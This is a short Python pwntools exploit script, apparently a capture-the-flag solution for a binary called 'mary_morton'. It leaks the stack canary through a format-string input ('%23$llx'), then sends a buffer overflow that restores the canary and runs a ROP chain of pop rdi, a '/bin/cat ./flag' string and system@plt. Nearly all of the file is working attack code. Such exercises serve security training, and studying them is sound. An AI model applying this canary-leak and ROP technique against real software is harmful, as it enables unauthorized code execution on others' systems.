from pwn import * 


p = process("./mary_morton")
binary = ELF("mary_morton")
print p.sendlineafter('3. Exit the battle \n','2')



#print p.sendline(b'2')
print p.sendline('%23$llx')        #format string to leak canary

recieved =p.recvline()
canary = int(recieved,16)

log.success("Canary: "+hex(canary))





#gadget 
pop_rdi = 0x400ab3  #: pop rdi; ret;

#arg
show_flag =0x400b2b #0x400b2b "/bin/cat ./flag"

#addr
system = binary.plt['system']

payload = ''
payload += 'a'*136
payload += p64(canary)
payload += 'b'*8
payload += p64(pop_rdi)
payload += p64(show_flag)
payload += p64(system)


p.sendlineafter('3. Exit the battle \n','1')
p.send(payload)
p.interactive()
